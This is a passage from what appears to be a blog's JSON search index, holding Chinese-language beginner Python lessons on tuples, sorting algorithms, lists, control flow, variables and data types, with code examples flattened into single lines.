tuple(&#x27;helloworld&#x27;)print(t[0]) # -&gt; hprint(t[1:5]) # -&gt; (&#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;)print(t[-3]) # -&gt; rt1 = (&#x27;Tom&#x27;,)t2 = (&#x27;Jack&#x27;,)t3 = t1 + t2print(t3) # -&gt; (&#x27;Tom&#x27;, &#x27;Jack&#x27;)print(t.index(&#x27;l&#x27;)) 四、列表与元组的转换123456789lst = [2,4,6,8,22]# 将列表转为元组t = tuple(lst)print(t)# 将元组转为列表t = (2,4,6,8,22)lst = list(t)print(lst) 12345# 二维元组tt = ((1,),(2,))print(tt)print(tt[0])print(type(tt[0])) 不希望容器内的元素被更改时，可以用元组，好处：增加程序的鲁棒性（健壮性）","categories":[],"tags":[]},{"title":"","slug":"05-1 排序","date":"2024-10-24T11:20:58.301Z","updated":"2024-10-07T05:21:03.351Z","comments":true,"path":"2024/10/24/05-1 排序/","permalink":"http://example.com/2024/10/24/05-1%20%E6%8E%92%E5%BA%8F/","excerpt":"","text":"排序一、排序算法 排序是计算机内经常进行的一个操作，其目的是将一组“无序”的序列调整为有序的序列。 程序：数据结构+算法 常见八大排序算法 冒泡排序、选择排序、插入排序、归并排序、快速排序、堆排序、基数排序、Shell排序. 二、冒泡排序 冒泡排序是一种简单的基本的排序算法。 算法原理： [9,8,7,5,6,4,3,2,1] 比较相邻的两个元素，如果第一个比第二个大，则交换它们两个 对每一对相邻的元素要做相同的工作，从开始的第一对直到最后一对，最后的元素就会是最大的数 针对所有的元素重复以上的步骤，除了最后一个 依次比较相邻的两个数，将小数放前面，大数放后面 1234567891011121314151617181920212223import randoma = []for i in range(10): a.append(random.randint(0, 100))print(&#x27;排序前：&#x27;, a)# 从小到大for i in range(len(a)-1): for j in range(len(a) - 1 - i): if a[j] &gt; a[j + 1]: a[j], a[j + 1] = a[j + 1], a[j]print(&#x27;排序后：&#x27;, a)# 从大到小for i in range(len(a)-1): for j in range(len(a) - 1 - i): if a[j] &lt; a[j + 1]: a[j], a[j + 1] = a[j + 1], a[j]print(&#x27;排序后：&#x27;, a) 三、选择排序 原理：每一趟从待排序的序列中选出最大或最小的一个元素，顺序放在已排好序的最后。 [49, 38, 65, 97, 76, 13, 27, 49] [49, 38, 65, 97, 76, 13, 27, 49] - &gt; [13, 38, 65, 97, 76,49, 27, 49]-&gt; [13, 27, 65, 97, 76,49, 38, 49] 12345678910111213141516171819import randoma = []for i in range(10): a.append(random.randint(0, 100))print(&#x27;排序前：&#x27;, a)for i in range(len(a)): # 找一个最小值的下标 min = i for j in range(i+1,len(a)): if a[min] &gt; a[j]: min = j a[min], a[i] = a[i], a[min]print(&#x27;排序后：&#x27;,a)# 1. 思想 2. 转代码 四、插入排序 思想：现在已经有一个有序的序列了，要求在这个已经的数据序列中，再插入一个数 插入排序是将序列分为两部分，最开始的时候第一个数就是一个有序部分，剩下的部分为无序部分，每次取无序部分中的第一个数和无序部分进行比较，放入到有序部分中的合适的位置 [65,27,59,64,58] [65] [27,59,64,58] [65] [27,59,64,58] -&gt; [27,65] [59,64,58] -&gt; [27,65] [64,58] 12345678910111213141516171819import randoma = []for i in range(10): a.append(random.randint(0, 100))print(&#x27;排序前：&#x27;, a)# 取无序部分的第一个元素，和有序部分进行比较，放在合适的位置# [65,27,59,64,58]# [20,27,59,65,65,,20]for i in range(len(a) - 1): for j in range(i + 1, 0, -1): if a[j] &lt; a[j - 1]: a[j], a[j - 1] = a[j - 1], a[j] else: breakprint(&#x27;排序后：&#x27;, a)","categories":[],"tags":[]},{"title":"","slug":"04 列表","date":"2024-10-24T11:20:58.299Z","updated":"2024-10-07T05:21:03.677Z","comments":true,"path":"2024/10/24/04 列表/","permalink":"http://example.com/2024/10/24/04%20%E5%88%97%E8%A1%A8/","excerpt":"","text":"列表一、什么是列表列表（list）是Python常用的一个数据类型，用于存储多个连续的有序的数据 存储多个值 数据是连续的 有序 允许有重复的元素 可以存储相同类型的数据 n &#x3D; [2,4,6,8,22] 也可以存储不同类型的数据 n &#x3D; [2,4,’six’,8,22] 为什么要使用列表: 存储多个值 a &#x3D; 2 b &#x3D; 4 c &#x3D; 6 d &#x3D; 8 e &#x3D; 22 麻烦 n &#x3D; [2,4,6,8,22] 二、如何创建列表 创建普通列表： 列表中的元素的类型是相同的 12n = [2,4,6,8,22] # 列表是用中括号/方括号表示，元素之间用逗号分隔n = [2,4,6,8,22,] 创建混合列表 列表中的元素是不同类型的 12n = [1,2,&#x27;c&#x27;,4,5] # 不建议这么使用print(n) 创建一个空列表 1empty = [] # 空列表 工厂函数 1234567t1 = list() # 构造函数 空列表 # a = int(5)# 使用可迭代对象构造一个列表t2 = list(range(10)) # [0, 1, 2, 3, 4, 5, 6, 7, 8, 9]print(t2)t3 = list(&quot;helloworld&quot;) # [&#x27;h&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;w&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;l&#x27;, &#x27;d&#x27;]print(t3) 三、访问列表中的元素列表中的每一个数据项称为列表的元素，列表中的元素是有顺序，在列表中每一个元素都有一个编号，来记录元素在列表中的位置，这个编号默认是从0开始，到n-1（其中n表示元素的个数），这个编号称之为下标或索引（index） 程序员的世界，标号一般都是从0开始 访问列表中的元素： 列表名[索引] 1234n = [2,4,6,8,22]print(n[0],n[1])print(n[5]) # IndexError: list index out of range 下标越界 12345678910# 遍历列表中的元素for i in n: print(i)# 第一个元素是x# 第二个元素是xcounter = 1for i in n: print(&#x27;第&#x27;+str(counter)+&#x27;个元素是：&#x27;+str(i)) counter += 1 交换列表中的两个元素的值 12n = [2, 4, 6, 8, 22]n[1],n[2] = n[2],n[1] 四、修改列表中的元素123n = [2, 4, 6, 8, 22]a = n[0]print(a, n[1]) # 把n[0]赋值给a或直接打印n[0] 把元素作为右值 获取它的值 如果要修改列表中的元素值，就是将它作为左值： 12n[0] = 3print(n) 五、添加列表元素 append()方法 作用：向列表最后添加一个元素 形式： L.append(object) 123letters = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]letters.append(&#x27;d&#x27;) # 函数、类和对象 print(letters) # =&gt; [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;,&#x27;d&#x27;] insert()函数 作用：在指定位置插入元素 形式：L.insert(index, object) 123letters = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]letters.insert(0,&#x27;A&#x27;)print(letters) # [&#x27;A&#x27;,&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;] extend()函数 作用：向一个列表中扩展另一个列表（将一个列表中的元素添加到另一个列表中） 形式：L.extend(iterable) 123456789l1 = [&#x27;a&#x27;,&#x27;b&#x27;,&#x27;c&#x27;]l2 = [&#x27;x&#x27;,&#x27;y&#x27;,&#x27;z&#x27;]# for l in l2:# l1.append(l)l1.extend(l2)print(l1)l1.extend(&quot;Helloworld&quot;) # [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;H&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;w&#x27;, &#x27;o&#x27;, &#x27;r&#x27;, &#x27;l&#x27;, &#x27;d&#x27;]print(l1) 面试题： ​ 实现列表去重： [2,4,6,4,8,22,6,30] 1234567891. set( [2,4,6,4,8,22,6,30] ) # 集合不允许有重复的元素 -- 打乱顺序2. numbers = [2, 4, 6, 4, 8, 22, 6, 30]empty = []for n in numbers: if n not in empty: # not in / in empty.append(n)print(empty) 判断列表中是否存在某个元素： 12345678910111213141516numbers = [2, 4, 6, 4, 8, 22, 6, 30]n = int(input(&#x27;请输入一个数：&#x27;))if n in numbers: print(n,&#x27;在列表中&#x27;)else: print(n,&#x27;不在列表中&#x27;)# flag = True# for i in numbers:# if n == i:# flag = False# print(n,&#x27;在列表中&#x27;)# break## if flag:# print(n,&#x27;不在列表中&#x27;) 六、删除列表中的元素 remove()函数 作用：移除列表中的一个已存在的元素，如果值不存在则抛出异常-出错 形式：L.remove(value) 123numbers = [2,4,6,8,22]numbers.remove(2)print(numbers) # =&gt;[4,6,8,22] 1234# 删除一个不存在的元素numbers = [2,4,6,8,22]numbers.remove(3)print(numbers) # ValueError: list.remove(x): x not in list pop()函数 作用：移除列表中的最后一个元素或者指定位置的元素，并返回被移除的元素 形式：L.pop([index] - 可选) 1234numbers = [2,4,6,8,22]item = numbers.pop() # 移除最后一个元素print(numbers) # [2,4,6,8]print(item) # 22 123456item = numbers.pop(1)print(item) # 4print(numbers) # [2, 6, 8]# 如果下标越界 则 出错item = numbers.pop(100) # IndexError: pop index out of range clear()函数 作用： 清空列表中的所有元素 形式：L.clear() 123numbers = [2,4,6,8,22]numbers.clear()print(numbers) #=&gt; [] del 操作符 作用：删除列表中的某个元素 形式：del n[0] 123numbers = [2,4,6,8,22]del numbers[0]print(numbers) 七、列表操作符 合并列表 1234a = [1,2,3]b = [4,5,6]c = a + b print(c) 重复操作符 123a = [1,2,3]print(a*3) # [1, 2, 3, 1, 2, 3, 1, 2, 3]# print(&quot;*&quot;*3) 成员操作符 in 操作符 ： 判断某个元素是否在某个列表中 not in 操作符 12345a = [1,2,3]print(1 in a)if 2 in a: pass 八、列表切片切片：截取列表中的部分元素 1234a = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;]print(a[1],a[2],a[3])b = [a[1],a[2],a[3]]print(b) 切片： a[start:stop:step] 123456789101112a = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;]b = a[1:4] # 表示从下标1开始到3 不包括4print(b) # [&#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;] c = a[1:] # 表示从下标1开始到结尾print(c) # [&#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;]d = a[:5] # 默认从0开始 到下标4print(d) # [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;]e = a[:] # 默认从0开始到最后 -- 拷贝print(e) # [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;,&#x27;F&#x27;] 切片支持负数： 123456789a = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;]b = a[-2] # 下标支持负数print(b)c = a[-2:] # 从倒数第二个到结尾print(c) # [&#x27;E&#x27;, &#x27;F&#x27;]d = a[:-1] # 从0开始到最后一个的前一个 取不到最后一个print(d) 切片时指定第三个参数 123a = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;]b = a[::2] # 第三个参数表示步长print(b) 123456a = [&#x27;A&#x27;, &#x27;B&#x27;, &#x27;C&#x27;, &#x27;D&#x27;, &#x27;E&#x27;, &#x27;F&#x27;]b = a[::-1] # [&#x27;F&#x27;, &#x27;E&#x27;, &#x27;D&#x27;, &#x27;C&#x27;, &#x27;B&#x27;, &#x27;A&#x27;] # 第三个参数为负数print(b)c = a[5:2:-1]print(c) # [&#x27;F&#x27;, &#x27;E&#x27;, &#x27;D&#x27;] 九、常用的函数和方法 在Python中提供了一些全局函数来直接操作列表 max()函数 12n = [2,4,6,8,22]print(max(n)) # 返回列表中的最大值 min()函数 12n = [2,4,6,8,22]print(min(n)) # 返回列表中的最小值 len()函数 1234567n = [2,4,6,8,22]print(len(n)) # 返回列表的元素的个数-长度 lengthn = [2,4,6,8,22]for i in range(len(n)): print(&#x27;第&#x27;+str(i+1)+&#x27;个值为：&#x27;,n[i]) sum()函数 12345678a = [1,2,3,4,5]print(sum(a))l = list(range(101)) print(sum(l)) # 计算1-100以内的所有整数和l = list(range(1,100,2)) # 计算1-100以内的所有奇数和print(sum(l)) 列表中的其它方法 list.count(item) : 统计item元素出现的次数 12n = [2,4,6,4,8,4,22]print(n.count(4)) # 3 list.index(item)：返回item元素第一次出现的位置 12n = [2,4,6,4,8,4,22]print(n.index(4)) # 1 list.reverse()：反转列表 修改原列表而不是生成一个新的列表 123n = [1,2,3,4,5,7]n.reverse()print(n) # [7, 5, 4, 3, 2, 1] list.sort()：对原列表排序 123456n = [1,5,3,7,2,8,100,40]n.sort()print(n) # [1, 2, 3, 5, 7, 8, 40, 100] 升序n.sort(reverse=True)print(n) # [100, 40, 8, 7, 5, 3, 2, 1] 降序 十、二维列表123456789101112131415# 一维列表a = [1,2,3]# 二维列表：的每一个元素都是一个一维列表a = [[1,2,3],[4,5,6]] print(a[0]) # =&gt; [1,2,3]# 元素的访问print(a[0][1])# 二维列表的遍历a = [[1,2,3],[4,5,6]] for i in a: for j in i: print(j) 列表推导式 1234567891011121314151617a = [0,1,2,3]a = list(range(4))a = [i for i in range(4)]print(a)a = [i*2 for i in range(4)] # [0, 2, 4, 6]print(a)# 二维列表b = [[1,2] for j in range(3)]print(b)b = [[i for i in range(4)] for j in range(3)]print(b)b = [[i*j for i in range(4)] for j in range(3)]print(b)","categories":[],"tags":[]},{"title":"","slug":"03 控制流","date":"2024-10-24T11:20:58.297Z","updated":"2024-10-07T05:21:03.392Z","comments":true,"path":"2024/10/24/03 控制流/","permalink":"http://example.com/2024/10/24/03%20%E6%8E%A7%E5%88%B6%E6%B5%81/","excerpt":"","text":"控制流一、三大控制结构 顺序结构：代码按上下文的顺序执行，逐行执行 选择结构 if选择结构 – 条件为真则执行代码块，否则什么也不做 if&#x2F;else – 二选一结构 if&#x2F;elif&#x2F;elif&#x2F;else 多选一 循环结构：重复执行某个代码块 for循环 while循环 二、选择结构 简单的if语言 1234567891. 基本形式 if 条件表达式: 语句/代码块 2. 例子 x = 3 y = 2 if x &gt; y : print(&quot;哟，数学还不错哦！&quot;) if&#x2F;else 二选一结构 123456a = int(input(&#x27;请输入：&#x27;))b = int(input(&#x27;请输入：&#x27;)) # ctrl + D 复制光标所在的行if a &gt; b: print(&quot;最大值为：&quot;, a)else: print(&quot;最大值为：&quot;, b) if&#x2F;elif&#x2F;elif&#x2F;elif …else 123456789101112131415161718192021msg = &quot;您好，欢迎致电中国联通客户服务热线.....&quot;print(msg)number = int(input(&quot;请选择：&quot;))# 全部使用if判断 效率低# if number == 1:# print(&quot;您选择了话费查询&quot;)# if number == 2:# print(&quot;您选择了流量查询&quot;)# if number == 3:# print(&quot;您选择了业务咨询&quot;)if number == 1: print(&quot;您选择了话费查询&quot;)elif number == 2: print(&quot;您选择了流量查询&quot;)elif number == 3: print(&quot;您选择了业务咨询&quot;)else: print(&quot;输入错误&quot;) 三、语句和缩进1、语句 123在代码中，能够表达某个意思、操作、逻辑的短代码，称之语句print(&quot;abc&quot;) # 一条语句 在python 一条语句结束时不需要加分号# C语言 printf(&quot;abc&quot;); 分号是语句结束的标志 1234a = 3 b = 5s = a * bprint(s) 1234567a = 3b = 5c = 8# 有折行时 需要加转义字符 \\x = a + \\ b + \\ c 2、代码块 123if 3 &gt; 2: print(&quot;哟，数学不错哦！！！&quot;) print(&quot;end!&quot;) 在C语言中通过{}来确定代码块： 1234if (3 &gt; 2)&#123; printf(&quot;哟，数学不错哦！！！&quot;) printf(&quot;end!&quot;)&#125; 3、缩进 建议缩进使用tab键 12345if 3 &gt; 2: print(&quot;哟，数学不错哦！！！&quot;) print(&quot;end!&quot;) # 错误的 # IndentationError: unexpected indent 缩进错误 4、pass语句 pass语句是一个点位语句，if 、while、for、函数中不知道代码怎么实现，或者需要以后再去实现时，可以先加一个pass语句，目的是不让代码报错 12def f(): pass 四、循环结构循环：满足某个条件时，重复执行某个代码块，被执行的代码块也称为循环体 for循环 基本语法： 12for 变量名 in 序列/可迭代对象： 循环体代码（可以有多行） 12345for i in &#x27;helloworld&#x27;: print(i) # h e l l ..... for i in [2,4,6,8,22]: print(i) 基本用法二： 12for 变量名 in range(start,end,[,step]) # step参数可选 语句 12for i in range(0,10): print(i) # 0 1 2 3 4 5 6 7 8 9 Python中range()函数的详细用法： range(0,10) 表示是一个0-9区间范围内的整数 是一个左闭右开的区间 range(10) 表示默认从0开始，到10-1 (stop-1) range(0,10,2)第三个参数的默认为1 步长 上楼梯 range(10,1,-1) 下楼梯 从10开始，到2 123456789# 0-100以内的所有的偶数for i in range(0,101,2): print(i,end=&quot; &quot;)# 0-100以内的所有的偶数 不使用步长for i in range(100): if i%2 == 0: print(i) Python3中range()返回的是一个可迭代对象 – 可以循环 Python2中range()返回的是一个列表 range(1,5)-&gt; [1,2,3,4] 计数器： 1234counter = 1 # 计数器for i in [2,4,6,8,22]: print(&#x27;第&#x27;+str(counter)+&#x27;个值为&#x27;+str(i)) counter += 1 C++语言： 123for (int i=0;i&lt;5;i++)&#123; //循环体代码&#125; while循环 基本形式： 12while 条件表达式（bool）： 代码块 12while 3 &gt; 2: print(&quot;哈哈哈哈&quot;) 12345678# 写一个死循环while True: pass或while 1: pass # Python3中while 1和 while True是等价 例子： 12345678910111213# 从键盘输入一个整数，逆序输出每一位数，并计算各位数之和# 12345 -&gt; 54321 15number = int(input(&#x27;请输入一个整数：&#x27;))n = numbersum = 0while n: left = n % 10 sum += left print(left,end=&#x27;&#x27;) n = n // 10print()print(str(number)+&quot;的各位数之和为：&quot;+str(sum)) 五、break和continue1、break语句 1234567counter = 1while 1: if counter &lt;= 100: print(&#x27;哈哈&#x27;) counter += 1 else: break # 终止循环-break所在循环 注意： 如果有多层循环，则break只会跳出当前在所在这一层 break只能用在循环中，一般是满足某个条件时来使用break 12345678910111213# 求n的阶乘# 从键盘输入一个数，求这个数的阶乘number = int(input(&#x27;请输入一个整数：&#x27;))n = numberresult = 1while 1: result *= n n -= 1 if n == 1: breakprint(str(number) + &#x27;的阶乘为：&#x27;+str(result)) 2、continue continue用于循环体内部，作用是结束（跳过）本次循环，继续下一次循环 1234for l in &#x27;Python&#x27;: if l == &#x27;y&#x27;: continue # 遇到continue 结束本次循环 后面不再执行 继续下一次的循环 print(&#x27;当前字母为：&#x27;, l) 六、循环嵌套内层的循环走的快，内层循环整个走完一次，外层循环加1 1234for i in range(0, 10): for j in range(0, 10): print(i, j, end=&#x27;,&#x27;) print() 12345# 实现99乘法表for i in range(1,10): for j in range(1,i+1): print(j,&quot;*&quot;,i,&quot;=&quot;,i*j,end=&#x27; &#x27;) print() 七、作用域泄露1234567a = int(input(&#x27;请输入：&#x27;))b = int(input(&#x27;请输入：&#x27;))if a &gt; b: max = a else: max = bprint(max)","categories":[],"tags":[]},{"title":"","slug":"02 变量和数据类型","date":"2024-10-24T11:20:58.295Z","updated":"2024-10-07T05:21:04.461Z","comments":true,"path":"2024/10/24/02 变量和数据类型/","permalink":"http://example.com/2024/10/24/02%20%E5%8F%98%E9%87%8F%E5%92%8C%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/","excerpt":"","text":"变量和数据类型一、变量12345678910变量：值是可以改变的组成： 变量名 + 值 a = 5 eg: 定义一个长方形的两条边，计算它的面积 公式：s=ab a = 5 b = 3 s = a*b print(s) # =&gt; 15 a = 8 s = a*b # 需要重新计算 print(s) # =&gt; 24 注意：在Python中，所有的变量必须先赋值再使用（先定义，在定义必须要赋值） 1234Traceback (most recent call last): File &quot;&lt;pyshell#9&gt;&quot;, line 1, in &lt;module&gt; print(d)NameError: name &#x27;d&#x27; is not defined 一行代码同时为多个变量赋同样的值 12a = b = c = 1print(a,b,c) # =&gt; 1 1 1 交换两个变量的值 1234567a = 3b = 5temp = aa = b b = temp# 在Python中，有更加简洁的方式a,b = b,a # =&gt; a,b = 5,3 变量的本质在代码中，定义a &#x3D; 5，对于计算机而言会做什么事情呢？ 1# 变量的本质：内存中一块存储空间，当我们声明一个变量时，计算机就需要在内存给变量分配一块内存空间 12// C语言int a = 5 # 4个字节 12# Python语言 一切皆对象a = 5 # a实际存储的并不是5这个值，而是地址 二、标示符标示符一般是指变量名、函数名、类名、包名等，在Python定义标示符时需要注意几下规则： 标示符不能以数字开头，可以由字母、数字、下划线来组成（甚至可以是中文，但是不建议） 中文命名可能出现乱码 在Python2中默认并不支持中文（标示符、代码中都不能出现中文），因为Python2的默认编码是ASCII，ASCII并不支持中文 A-65 a-97 要让Python2支持中文，需要在文件头加 # coding:utf-8 在Python3中默认使用的是unicode字符集（万国码-支持世界所有的语言-规范标准 - utf-8编码方式 ） 区分大小写 name 和Name是两个变量 不能以Python中的关键字和保留字作为标示符 1234&gt;&gt;&gt; import keyword&gt;&gt;&gt; print(keyword.kwlist)[&#x27;False&#x27;, &#x27;None&#x27;, &#x27;True&#x27;, &#x27;and&#x27;, &#x27;as&#x27;, &#x27;assert&#x27;, &#x27;break&#x27;, &#x27;class&#x27;, &#x27;continue&#x27;, &#x27;def&#x27;, &#x27;del&#x27;, &#x27;elif&#x27;, &#x27;else&#x27;, &#x27;except&#x27;, &#x27;finally&#x27;, &#x27;for&#x27;, &#x27;from&#x27;, &#x27;global&#x27;, &#x27;if&#x27;, &#x27;import&#x27;, &#x27;in&#x27;, &#x27;is&#x27;, &#x27;lambda&#x27;, &#x27;nonlocal&#x27;, &#x27;not&#x27;, &#x27;or&#x27;, &#x27;pass&#x27;, &#x27;raise&#x27;, &#x27;return&#x27;, &#x27;try&#x27;, &#x27;while&#x27;, &#x27;with&#x27;, &#x27;yield&#x27;] 命名的细节（开发规范&#x2F;开发习惯） name &#x3D; “Mr_lee” age &#x3D; 18 望文生义，便于理解和记忆 （不要使用拼音 ） 变量名和函数名，建议使用小写。如果由多个单词组成时，中间用下划线连接（this_is_a_var）或不用下划线连接，连接处的单词首字母大写(helloWord) - 小驼峰 类名：每个单词的首字母大写，其余全部小写（HelloWorld） - 大驼峰 包名：全部小写，不加下划线 三、数据类型123在Python中定义的每一个变量都是有类型的a = 5 此时变量a的类型是整型 ints = &#x27;helloworld&#x27; s的类型的是字符串str 在Python定义变量时，不需要声明类型，与C语言不一样 12// C语言定义变量时，必须先指定数据的类型int a = 5; 动态数据类型: 变量在声明时，不需要指定数据类型 如：Python 12a = 5 # =&gt; inta = &#x27;helloworld&#x27; # =&gt; str字符串 修改了a的类型 代码在执行会根据值来推导出它的数据类型 静态数据类型：在声明变量时，需要先指定数据类型，如：C、C++、Java 123//C语言int a = 5; //a是整型a = &#x27;helloworld&#x27; //错误 不可以改变它的类型 Python中常见的数据类型（内置的数据类型） 数字类型（广义） 整型(整数 int) a &#x3D; 5 浮点型（小数 float 不区分单精度和双精度） pi &#x3D;- 3.14 复数 a + bj 用的很少 布尔类型 表示为真和假 值可以为True和False 在内存中是以1和0进行存储的 本质上是整型 123456&gt;&gt;&gt; True + True # =&gt; 1&gt;&gt;&gt; 3 &gt; 2 # =&gt; True# 表示性别gender = True # 男gender = False # 女 字符串类型 使用’x’或”x”或’’’x’’’或”””x”””都表示是字符串 1234567a = Tom # 错误a = &quot;Tom&quot;a = &#x27;Tom&#x27;a = &quot;&quot;&quot;可以换行 表示多行字符串&quot;&quot;&quot; 12a = &quot;Tom\\n哈哈&quot;print(a) 转义字符 \\n 表示换行 \\t 表示制表符 4个空格(有小问题) \\&#39; 输出单引号 在单引号中嵌套单引号 \\&quot; 输出双引号 在双引号嵌套双引号 \\\\ 输出一个反斜杠 可以直接在单引号中嵌套双引号或在双引号中嵌套单引号 空类型 ： None a &#x3D; None 容器类型（广义）： 列表 – C中的数组 存储多个数据 [2,4,6,8,22] 元组 – 可以理解为是一个不可变化的“列表” (2,4,6,8,22) 字典 – {key:value,…} 集合 - {2,3,4,5} 四、输入和输出1、输出 使用print()函数，输出某个变量或某个值到屏幕中 内存-&gt;屏幕 123a = 5print(a) # =&gt; 5 默认会有一个\\n 换行 123456# 一次输出多个值a = 5b = 10print(a,b)print(&quot;a=&quot;,a,&quot;b=&quot;,b) 为什么print会自动换行 1234# 源代码print(self, *args, sep=&#x27; &#x27;, end=&#x27;\\n&#x27;, file=None)有一个end参数，默认值为\\n，可以覆盖掉print(a,b,c,d,end=&#x27;;&#x27;) 注释方式： 单行注释 # 多行注释 ‘’’ ‘’’ 或 “”” “”” 注释的作用： 解释说明： 给代码添加额外的说明，解释代码的作用 屏蔽代码：不让代码执行 2、输入输入是从键盘输入一个值给内存中某个变量 1234&gt;&gt;&gt; a = input() # 从键盘输入的数据默认都是字符串5&gt;&gt;&gt; a&gt;&gt;&gt; &#x27;5&#x27; 12# 加提示&gt;&gt;&gt; a = input(&#x27;请输入&#x27;) 输入整数： 12345&gt;&gt;&gt; a = int(input(&#x27;请输入&#x27;)) # 类型转换 字符串-&gt;int&gt;&gt;&gt; a # 整数&gt;&gt;&gt; a = float(input(&#x27;请输入&#x27;)) # 类型转换 字符串-&gt;float&gt;&gt;&gt; a # 浮点型 五、类型转换1、将其它类型转为int类型 float转int 123pi = 3.14a = int(pi)print(a) # =&gt; 3 str转int 123s = &#x27;125&#x27;a = int(s)print(a) bool转int 123y = Truea = int(y)print(a) # =&gt; 1 2、将其它类型转为float类型 int转float 123a = 5b = float(a)print(b) # =&gt; 5.0 str转float 123s = &#x27;3.14&#x27;f = float(s)print(f) bool转float 123y = Truef = float(y)print(f) # =&gt; 1.0 3、将其它类型转为str类型 int转str 123a = 5s = str(a)print(s) # 5 字符串类型的5 float转str 1234pi = 3.14s = str(pi)print(s)print(type(s)) # =&gt; &lt;class &#x27;str&#x27;&gt; bool转str 123y = Trues = str(y)print(s) # =&gt; True 字符串的True 列表转str 123n = [2,4,6,8,22]s = str(n)print(s) # =&gt; &#x27;[2, 4, 6, 8, 22]&#x27; 将字符串和整数相加： 12345r = &#x27;a&#x27; + 1 # 字符串和整数不能直接相加print(r)r = &#x27;a&#x27; + str(1) # &#x27;a&#x27; + &#x27;1&#x27; = &#x27;a1&#x27; 字符串拼接print(r) 六、获取类型 type()函数：获取某个变量或值的数据类型 1234567891011a = 5print(type(a)) # &lt;class &#x27;int&#x27;&gt; 类 一切皆对象s = &#x27;helloworld&#x27;print(type(s)) # &lt;class &#x27;str&#x27;&gt;c = 2 + 3jprint(type(c)) # &lt;class &#x27;complex&#x27;&gt;l = [2,4,6,8,22]print(type(l)) # &lt;class &#x27;list&#x27;&gt; 列表 清单 isinstance()函数：判断某个变量或值是否为某个类型 结果为bool类型 12a = 5print(isinstance(a,int)) # True 七、运算符和表达式 什么是运算符 运算符也称为操作符，+ - * &#x2F; % &gt; &lt; … operator 什么是表达式 由操作符和操作数组成的，a + b ， a&gt;b ，a 也可以是一个单值 运算符的分类： 算术运算符 1234567# + - * / % //print(3 / 5) # =&gt; 0.6print(3 % 5) # =&gt; 3print(5 % 3) # =&gt; 2print( 3 // 5) # 向下取整 地板除 floor print(5 // 3) # 关系运算符 123456# &gt; &lt; &gt;= &lt;= == !=print(5 &gt; 3) # Trueprint(5 == 3) # Falseif a &gt; b: xxx 赋值运算符 12a = 5 # a是作为左值 -- 修改b = a # 把a作为右值 -- 取值 print(id(a),id(b)) 0-256 复合赋值运算符 1234# += -= *= /= %= //=a = 5a += 3 # 等价 a = a + 31. 更加简洁 2. 更加利于计算机解析 逻辑运算符 123456789# 逻辑与 and 左右两边的表达式都为真 则结果为真# 逻辑或 or 其中一个表达式为真结果就为真# 逻辑非 not 取反# 一般会参与到if中作为条件判断a = 5b = 3if a and b: xxx 输入一个年份，计算这一年是否为闰年 123456year = int(input(&#x27;请输入年份：&#x27;))# 能被4整除不能被100整除或能被400整除if year % 4 == 0 and year % 100 != 0 or year % 400 == 0: print(year,&quot;是闰年&quot;)else: print(year，&quot;是平年&quot;) 位运算符(了解) 12345678# 按位运算： 按位与、按位或、按位取反、按位异或、左移、右移# 按位运算时，需要将数据转为二进制运算00000011 00000111 1. 按位与： 都为1时则为1，否则为02. 按位或： 有一个为1则为13. 按位异或：相同为0 不同为14. 按位取反： 1变0 0变1 补码运算5. 左移： 往左移动 高位丢弃，低位补06. 右移： 往右移动 低位丢弃，高位补0 12345678a = 0b00111100 # 10进制的60b = 0b00001101print(a&amp;b) # 0b00001100 -&gt; 12print(a|b) # 0b00111101 -&gt; 61print(a^b) # 0b00110001 -&gt; 49print(~a) # -a-1 -61print(a&lt;&lt;2) # 0b11110000 -&gt; 240 左移几位2几次方 2**2=4print(a&gt;&gt;2) # 0b00001111 -&gt; 15 三元运算符 123456789101112131415 # a = 3# b = 5# max = 0# if a &gt; b:# max = a# else:# max = b# print(max)# C语言中 # max = a &gt; b ? a : b # Python客户# max = a if a &gt; b else b 八、运算符的优先级12341. 先算乘除再算加减，遇到括号先算括号里的 2. ** 幂运算优先级比较高....3. not &gt; and &gt; or 作业： 1. 练习上课代码 2. 总结笔记 3.","categories":[],"tags":[]},{"title":"","slug":"01 Python概述","date":"2024-10-24T11:20:58.292Z","updated":"2024-10-07T05:21:04.406Z","comments":true,"path":"2024/10/24/01 Python概述/","permalink":"http://example.com/2024/10/24/01%20Python%E6%A6%82%E8%BF%B0/","excerpt":"","text":"Python概述一、Python应用领域1234567891011Python是一个编程语言，写计算机程序，写的程序可以做什么？1. Web开发 - Web网站2. 自动化运维 - 维护系统运行、系统监测、自动化环境部署3. 科学计算 - 处理工程技术和科学研究遇到的问题4. 网络爬虫 - 写一个Python程序来自动运行后获取网络上的数据5. 数据分析 - 对大量数据进行研究分析，可视化的展示，图表图像等6. 机器学习 - alphago 7. 深度学习 - 机器学习的一个分支8. 游戏开发 pygame模块 （C++/C#做游戏开发）... 企业：Youtube、Instagram、豆瓣、google、Yahoo、NASA等都在大量地去使用Python 二、Python简介123456781. Python 翻译 蟒蛇 